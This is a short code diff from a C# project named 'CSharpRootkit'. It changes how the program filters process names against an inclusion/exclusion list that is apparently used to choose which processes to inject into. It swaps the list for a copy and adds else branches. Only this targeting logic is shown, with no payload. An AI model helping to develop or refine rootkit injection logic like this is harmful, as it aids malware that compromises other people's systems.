@@ -845,7 +845,7 @@ namespace CSharpRootkit
                     }
                 }
 
-                foreach (string name in InjectProcessNameInclusionExclusionList)
+                foreach (string name in InclusionExclusionProcessNamesCopy)
                 {
                     if (processName == name)
                     {
@@ -853,6 +853,10 @@ namespace CSharpRootkit
                     }
                 }
 
+            }
+            else 
+            {
+                return !isInclusion;
             }
 
             return isInclusion;
@@ -883,7 +887,7 @@ namespace CSharpRootkit
                     }
                 }
 
-                foreach (string name in InjectProcessNameInclusionExclusionList)
+                foreach (string name in InclusionExclusionProcessNamesCopy)
                 {
                     if (processName == name)
                     {
@@ -892,7 +896,10 @@ namespace CSharpRootkit
                 }
 
             }
-
+            else
+            {
+                return !isInclusion;
+            }
             return isInclusion;
         }
 
